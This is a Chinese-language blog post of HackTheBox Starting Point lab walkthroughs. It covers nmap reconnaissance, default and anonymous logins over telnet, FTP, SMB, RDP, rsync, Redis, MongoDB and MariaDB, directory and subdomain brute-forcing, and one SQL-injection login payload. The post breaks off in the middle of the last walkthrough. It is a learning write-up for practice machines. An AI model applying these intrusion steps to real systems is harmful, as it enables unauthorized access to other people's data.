---
title: Starting Point Write Up on Hackthebox
description: 一堆 Starting Point 的靶機 Walkthrough!
pubDate: 07 05 2023
categories:
  - life
tags:
  - PT
---

# 滲透測試筆記

## Meow (Pwned!)

* 先 nmap 起手掃一遍
* 可以觀察到有 port 23 (telnet)
* 暴力試試看有的帳號 `admin` `administrator` `root`
* 到 `root` 登入了 !
* Get FLAG!

## Fawn (Pwned!)

* 一樣 nmap 起手

```bash!
┌─[tusoaring@htb-rlw5fctiog]─[~]
└──╼ $nmap -Pn -sV -sC 10.129.7.163
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 21:32 CDT
Nmap scan report for 10.129.7.163
Host is up (0.011s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.96
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix
```

* 看到有 FTP
* 嘗試登入

```bash!
ftp 10.129.7.163
```

* 嘗試登入

```bash!
admin、adminastrator、root、anonymous
```

* 試到 anonymous 的時候成功

```bash!
Name (10.129.7.163:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX
```

`ls` 後看到有 flag.txt

* 用 get 這個指令下載

```bash!
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||42514|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***********************************|    32       42.28 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (3.40 KiB/s)
```

* 回去電腦看就有了

```bash!
035db21c881520061c53e0536e44f815
```

## Dancing (Pwned!)

* 一樣先 NMAP 起手

```bash=
─[tusoaring@htb-1famon8h34]─[~]
└──╼ $nmap -sC -sV -Pn 10.129.215.64 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 01:52 CDT
Nmap scan report for 10.129.215.64
Host is up (0.011s latency).
Not shown: 947 closed tcp ports (reset), 50 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-03T10:52:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 3h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.12 seconds

```

* 看到這台是個有開 SMB 的機器
* 用 `smbclient -L` 這個指令觀察有甚麼 share 的資料夾

```bash=
┌─[tusoaring@htb-1famon8h34]─[~]
└──╼ $smbclient -L 10.129.215.64 
Password for [WORKGROUP\tusoaring]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.215.64 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

* 可以發現 WorkShares 這個資料夾不用密碼就可以存取
* 直接進去

```bash=
┌─[✗]─[tusoaring@htb-1famon8h34]─[~]
└──╼ $smbclient \\\\10.129.215.64/WorkShares
Password for [WORKGROUP\tusoaring]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 03:22:01 2021
  ..                                  D        0  Mon Mar 29 03:22:01 2021
  Amy.J                               D        0  Mon Mar 29 04:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021

		5114111 blocks of size 4096. 1734229 blocks available
smb: \> cd Amy.J\
```

* 最後在 James.P 的資料夾找到 FLAG
* 用 get 把 flag 載下來就好了

```bash!
5f61c10dffbc77a704d76016a22f1664
```

## Redeemer (Pwned!)

* 一樣 nmap 起手掃看看
* 這邊 `-p-` 的意思是掃所有 port
* `-T4` 的意思是快速掃

```bash=
┌─[tusoaring@htb-1famon8h34]─[~]
└──╼ $nmap -sC -sV -Pn -p- -T4  10.129.118.118
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 01:21 CDT
Nmap scan report for 10.129.118.118
Host is up (0.0090s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
```

* 有台 redis 在上面

[Redis 在幹嘛~](https://hackmd.io/@cynote/BkobMykLw)

* 直接用 redis-cli 連上去

```bash=
redis-cli -h 10.129.118.118
```

* 連上去後可以先用 `info` 看到一些基本資訊

```bash=
10.129.118.118:6379> info
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:753
run_id:d285de4141cf3ace3f006256d4a11feb25a5a112
tcp_port:6379
uptime_in_seconds:1033
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:8711697
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:5840896
used_memory_rss_human:5.57M
used_memory_peak:859624
used_memory_peak_human:839.48K
used_memory_peak_perc:100.00%
used_memory_overhead:846142
used_memory_startup:796224
used_memory_dataset:13482
used_memory_dataset_perc:21.26%
allocator_allocated:1601400
allocator_active:1949696
allocator_resident:9158656
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.22
allocator_frag_bytes:348296
allocator_rss_ratio:4.70
allocator_rss_bytes:7208960
rss_overhead_ratio:0.64
rss_overhead_bytes:-3317760
mem_fragmentation_ratio:7.14
mem_fragmentation_bytes:5023280
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1719987597
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:413696
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:7
total_commands_processed:8
instantaneous_ops_per_sec:0
total_net_input_bytes:346
total_net_output_bytes:18213
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:504
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:7996f26a9a5e68fd7dcf4351a0dd5b48a0f64e5f
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:1.052812
used_cpu_user:0.957810
used_cpu_sys_children:0.000000
used_cpu_user_children:0.001695

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

* 可以看到有 db0 這個資料庫
* 我們用 select 指令切換 (在 index 0)

```bash=
select 0
```

* 進來後可以用 `KEYS *` 查看你面的資料

```bash=
10.129.118.118:6379> KEYS * 
1) "flag"
2) "numb"
3) "temp"
4) "stor"
```

* 最後用 `GET` 就可以看到裡面的資料 (FLAG) 了!

```bash=
10.129.118.118:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
```

[官方語法](https://redis.io/docs/latest/commands/)

## Explosion (Pwned!)

* 一樣先 NMAP 起手

```bash=
┌─[✗]─[tusoaring@htb-1famon8h34]─[~]
└──╼ $nmap -sC -sV -Pn 10.129.235.84
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 02:21 CDT
Nmap scan report for 10.129.235.84
Host is up (0.0099s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-07-03T07:21:55+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2024-07-03T07:21:48+00:00
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2024-07-02T07:03:24
|_Not valid after:  2025-01-01T07:03:24
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-07-03T07:21:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.76 seconds
```

* 看到 port 3389 有開，它是遠端桌面通訊協定（RDP）預設的連接埠
* 我們可以用 `xfreerdp` 這個工具

[這邊可以看到基本的用法](https://linuxcommandlibrary.com/man/xfreerdp)

* `/u:` 指定 username
* `/p:` 指定 password
* `/v:` 指定 Ip

* 嘗試連線

```bash=
┌─[tusoaring@htb-1famon8h34]─[~]
└──╼ $xfreerdp /v:10.129.235.84:3389 /u:administrator
```

* 這帳號居然不用 password 就可以登入

![image](https://hackmd.io/_uploads/SJ8u6_Gv0.png)

* 遠端成功! 就拿到 flag 了!

## Preignition (Pwned!)

* 直接 NMAP 起手

```bash=
┌─[tusoaring@htb-1famon8h34]─[/usr/share/wordlists/dirbuster]
└──╼ $nmap -sC -sV -Pn 10.129.239.135
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 03:02 CDT
Nmap scan report for 10.129.239.135
Host is up (0.0098s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.65 seconds
```

* 開了個網頁服務
* 進去看什麼都沒，直接工具開掃

```bash=
ffuf -u "http://10.129.239.135/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php
```

* 或是

```bash=
gobuster dir -u 10.129.239.135 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

* 找到 `admin.php` ， 試了 `admin/admin` 就登入拿到 flag ㄌ!

## Mongod (Pwned!)

* NMAP 起手++

```bash=
─[tusoaring@htb-1famon8h34]─[~]
└──╼ $nmap -sC -sV -Pn -p- -T4 10.129.228.30
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 03:26 CDT
Nmap scan report for 10.129.228.30
Host is up (0.0094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
27017/tcp open  mongodb MongoDB 3.6.8 3.6.8
| mongodb-databases: 
|   totalSize = 270336.0
|   databases
|     3
|       name = sensitive_information
|       empty = false
|       sizeOnDisk = 32768.0
|     2
|       name = local
|       empty = false
|       sizeOnDisk = 73728.0
|     4
|       name = users
|       empty = false
|       sizeOnDisk = 32768.0
|     1
|       name = config
|       empty = false
|       sizeOnDisk = 98304.0
|     0
|       name = admin
|       empty = false
|       sizeOnDisk = 32768.0
|_  ok = 1.0
| mongodb-info: 
|   MongoDB Build info
|     gitVersion = 8e540c0b6db93ce994cc548f000900bdc740f80a
|     storageEngines
|       3 = wiredTiger
|       2 = mmapv1
|       1 = ephemeralForTest
|       0 = devnull
|     ok = 1.0
|     versionArray
|       3 = 0
|       2 = 8
|       1 = 6
|       0 = 3
|     allocator = tcmalloc
|     debug = false
|     modules
|     maxBsonObjectSize = 16777216
|     version = 3.6.8
|     bits = 64
|     buildEnvironment
|       distarch = x86_64
|       distmod = 
|       linkflags = -Wl,-Bsymbolic-functions -Wl,-z,relro -pthread -Wl,-z,now -rdynamic -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       target_arch = x86_64
|       target_os = linux
|       cxx = g++: g++ (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
|       cc = cc: cc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
|       cxxflags = -g -O2 -fdebug-prefix-map=/build/mongodb-FO9rLu/mongodb-3.6.9+really3.6.8+90~g8e540c0b6d=. -fstack-protector-strong -Wformat -Werror=format-security -Woverloaded-virtual -Wpessimizing-move -Wredundant-move -Wno-maybe-uninitialized -Wno-class-memaccess -std=c++14
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Wno-error=c++1z-compat -Wno-error=noexcept-type -Wno-error=format-truncation -Wno-error=int-in-bool-context -Winvalid-pch -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-const-variable -Wno-unused-but-set-variable -Wno-missing-braces -Wno-format-truncation -fstack-protector-strong -fno-builtin-memcmp
|     openssl
|       compiled = OpenSSL 1.1.1f  31 Mar 2020
|       running = OpenSSL 1.1.1f  31 Mar 2020
|     sysInfo = deprecated
|     javascriptEngine = mozjs
... 以下省略
```

* [有 mongodb 那是種 nosql 資料庫](https://www.gaia.net/tc/news_detail/2/134/what-is-mongodb)
* 那就用 mongosh 連上去看看!

```bash=
┌─[tusoaring@htb-1famon8h34]─[~]
└──╼ $mongosh --host 10.129.228.30
Current Mongosh Log ID:	668514c186ff5f7460597192
Connecting to:		mongodb://10.129.228.30:27017/?directConnection=true&appName=mongosh+2.2.9
Using MongoDB:		3.6.8
Using Mongosh:		2.2.9
mongosh 2.2.10 is available for download: https://www.mongodb.com/try/download/shell

For mongosh info see: https://docs.mongodb.com/mongodb-shell/

------
   The server generated these startup warnings when booting
   2024-07-03T08:05:55.418+0000: 
   2024-07-03T08:05:55.418+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
   2024-07-03T08:05:55.418+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem
   2024-07-03T08:05:57.248+0000: 
   2024-07-03T08:05:57.248+0000: ** WARNING: Access control is not enabled for the database.
   2024-07-03T08:05:57.248+0000: **          Read and write access to data and configuration is unrestricted.
   2024-07-03T08:05:57.248+0000:
------

test> 
```

* 指定 host 就連到了!
* 我們來看看 `db` 有甚麼，用 `show dbs` 查看

```bash=
test> show dbs
admin                  32.00 KiB
config                 72.00 KiB
local                  72.00 KiB
sensitive_information  32.00 KiB
users                  32.00 KiB
```

* 看一下 sensitive_information
* 用 `use` 可以切換 db

```bash=
test> use sensitive_information
switched to db sensitive_information
sensitive_information>
```

* 看一下 collections ， 一樣用 `show`

```bash=
sensitive_information> show collections
flag
```

* 找到 flag 了! 讀取它
* 用 `db.{collection's name}_find()` 讀取!

```bash=
sensitive_information> db.flag.find()
[
  {
    _id: ObjectId('630e3dbcb82540ebbd1748c5'),
    flag: '1b6e6fb359e7c40241b6d431427ba6ea'
  }
]
```

```bash=
1b6e6fb359e7c40241b6d431427ba6ea
```

## Synced (Pwned!)

* NMAP 起手++++

```bash=
┌─[tusoaring@htb-356ghjqh5e]─[~/Desktop]
└──╼ $nmap -sC -sV -Pn 10.129.228.37
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 09:47 CDT
Nmap scan report for 10.129.228.37
Host is up (0.011s latency).
Not shown: 999 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.07 seconds
```

* [了解一下 rsync 這個服務](https://blog.gtwang.org/linux/rsync-local-remote-file-synchronization-commands/)

* 所以我們直接看看有甚麼檔案可以用
* `--list-only` 就是只列出檔案，不下載

```bash=
┌─[tusoaring@htb-356ghjqh5e]─[~/Desktop]
└──╼ $rsync -rv rsync://10.129.228.37/ ./ --list-only
public         	Anonymous Share
```

* 追進去 `public` 這個資料夾

```bash=
┌─[tusoaring@htb-356ghjqh5e]─[~/Desktop]
└──╼ $rsync -rv rsync://10.129.228.37/public ./ --list-only
receiving incremental file list
drwxr-xr-x          4,096 2022/10/24 17:02:23 .
-rw-r--r--             33 2022/10/24 16:32:03 flag.txt

sent 24 bytes  received 72 bytes  10.11 bytes/sec
total size is 33  speedup is 0.34
```

* 看到FLAG了! 下載!

```bash=
┌─[tusoaring@htb-356ghjqh5e]─[~/Desktop]
└──╼ $rsync -rv rsync://10.129.228.37/public/flag.txt ./
receiving incremental file list
flag.txt

sent 43 bytes  received 133 bytes  27.08 bytes/sec
total size is 33  speedup is 0.19

┌─[tusoaring@htb-356ghjqh5e]─[~/Desktop]
└──╼ $cat flag.txt 
72eaf5344ebb84908ae543a719830519
```

* 拿到 FLAG 了~

### rsync 常用參數

* `-v`：verbose 模式，輸出比較詳細的訊息。
* `-r`：遞迴（recursive）備份所有子目錄下的目錄與檔案。
* `-a`：封裝備份模式，相當於 -rlptgoD，遞迴備份所有子目錄下的目錄與檔案，保留連結檔、檔案的擁有者、群組、權限以及時間戳記。
* `-z`：啟用壓縮。
* `-h`：將數字以比較容易閱讀的格式輸出。

#### 關於為什麼要用 rsync://{IP}

```bash=
Usage: rsync [OPTION]... SRC [SRC]... DEST
  or   rsync [OPTION]... SRC [SRC]... [USER@]HOST:DEST
  or   rsync [OPTION]... SRC [SRC]... [USER@]HOST::DEST
  or   rsync [OPTION]... SRC [SRC]... rsync://[USER@]HOST[:PORT]/DEST
  or   rsync [OPTION]... [USER@]HOST:SRC [DEST]
  or   rsync [OPTION]... [USER@]HOST::SRC [DEST]
  or   rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]
The ':' usages connect via remote shell, while '::' & 'rsync://' usages connect
to an rsync daemon, and require SRC or DEST to start with a module name.
```

## Appointment (Pwned!)

* NMAP++++++

```bash=
┌─[tusoaring@htb-356ghjqh5e]─[~]
└──╼ $nmap -sC -sV -Pn 10.129.224.236
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 10:18 CDT
Nmap scan report for 10.129.224.236
Host is up (0.0098s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds
```

* 有個網頁服務，直接去看看
* 是個登入頁面，結果我先去掃網頁目錄 (什麼都沒掃到 X
* 回去看敘述結果是 sql-injection ， 直接 `admin/' or 1=1;--# '` 就有FLAGㄌ...

![image](https://hackmd.io/_uploads/ryjmR1mvR.png)

## Sequel (Pwned!)

* 繼續 NMAP 起手++++++++

```bash=
┌─[tusoaring@htb-356ghjqh5e]─[~]
└──╼ $nmap -sC -sV -Pn 10.129.210.28
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 10:46 CDT
Stats: 0:02:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.96% done; ETC: 10:49 (0:00:00 remaining)
Nmap scan report for 10.129.210.28
Host is up (0.0082s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 119
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, ODBCClient, LongColumnFlag, FoundRows, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsTransactions, Speaks41ProtocolOld, Support41Auth, SupportsCompression, DontAllowDatabaseTableColumn, InteractiveClient, SupportsLoadDataLocal, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: p/7dt<l,2V>n5X;_OJfC
|_  Auth Plugin Name: mysql_native_password
```

* 觀察到用 `mysql` ， `root` 還沒有設密碼
* 直接本地拿 `mysql` 遠端登入

```bash=
┌─[✗]─[tusoaring@htb-356ghjqh5e]─[~]
└──╼ $mariadb -h 10.129.210.28 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 132
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

* `-h` 代表 Host
* `-u` 代表 Username
* `-p` 代表 Password

* 用 `show` 看一下有甚麼 db

```bash=
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

* 用 `use` 看看 `htb` 有甚麼

```bash=
MariaDB [(none)]> use htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

* 一樣用 `show` 看看有甚麼 table

```bash=
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.009 sec)
```

* 用 sql 語法看看 `config` 有啥~

```bash=
MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.009 sec)
```

* GET FLAG!!!

## Crocodile (Pwned!)

* NMAP 起手+++++++++++++++++

```bash=
┌─[tusoaring@htb-356ghjqh5e]─[~]
└──╼ $nmap -sC -sV -Pn 10.129.1.15
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 13:39 CDT
Nmap scan report for 10.129.1.15
Host is up (0.010s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.22
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
```

* 有個 FTP 服務，照之前的登入服務登入看看~

```bash=
─[✗]─[tusoaring@htb-356ghjqh5e]─[~]
└──╼ $ftp 10.129.1.15
Connected to 10.129.1.15.
220 (vsFTPd 3.0.3)
Name (10.129.1.15:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

* 登入成功! 載載看剛剛在 nmap 看到的檔案~

```bash=
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||41791|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |***********************************|    33      325.52 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (4.04 KiB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||42842|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |***********************************|    62      432.47 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (7.55 KiB/s)
```

* 打開來看看

```bash=
┌─[tusoaring@htb-356ghjqh5e]─[~]
└──╼ $cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
┌─[tusoaring@htb-356ghjqh5e]─[~]
└──╼ $cat allowed.userlist.passwd 
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

* 剛剛在 nmap 還看到有個網頁，居然拿到帳號密碼，通靈看看 `login.php`
* 居然中了，把 `admin/rKXM59ESxesUFHAd` 拿去登入就可以看到 flag 了~

![image](https://hackmd.io/_uploads/rk5lTMXD0.png)

## Three (Pwned!)

* NMAP 起手++++++++++++++++++++

```bash=
┌─[tusoaring@htb-qpxebqmsfv]─[~/Desktop]
└──╼ $nmap -sC -sV -Pn -p- -T4 10.129.169.167
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-04 00:14 CDT
Nmap scan report for thetoppers.htb (10.129.169.167)
Host is up (0.0093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.44 seconds
```

* 有個網站服務，連進去看看
* 根據題目說我們可以列舉看看 subdomain，而 domain 的位置在

![image](https://hackmd.io/_uploads/H1pDe2mvR.png)

* 猜測應該是這個 `thetoppers.htb` 我們把它加到 `/etc/hosts` 解析 domain

```bash=
┌─[tusoaring@htb-qpxebqmsfv]─[~/Desktop]
└──╼ $cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	debian12-parrot

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
127.0.1.1 htb-qpxebqmsfv htb-qpxebqmsfv.htb-cloud.com
10.129.169.167 thetoppers.htb
```

* 連接沒問題，可以開始列舉看看 `subdomain` 了


```bash=
┌─[tusoaring@htb-qpxebqmsfv]─[~/Desktop]
└──╼ $wfuzz -c -w ./subdomaindict.txt -u "http://thetoppers.htb/" -H "Host: FUZZ.thetoppers.htb"

000000248:   200        234 L    1036 W     11947 Ch    "alpha"
000000244:   200        234 L    1036 W     11947 Ch    "panelstats"
000000247:   404        0 L      2 W        21 Ch       "s3"
000000214:   200        234 L    1036 W     11947 Ch    "mail4"
000000228:   200        234 L    1036 W     11947 Ch    "rss"
000000246:   200        234 L    1036 W     11947 Ch    "cacti" 
```

* 這邊不知道為什麼用 `ffuf` 掃不出來，所以我學別人用 `wfuzz`
* 找到 s3 的 responses 有點不一樣
* 所以我把 `s3.thetoppers.htb` 加進 `/etc/hosts` (同個 Ip) 然後去 `curl`

```bash=
┌─[tusoaring@htb-qpxebqmsfv]─[~]
└──╼ $cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	debian12-parrot

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1 localhost
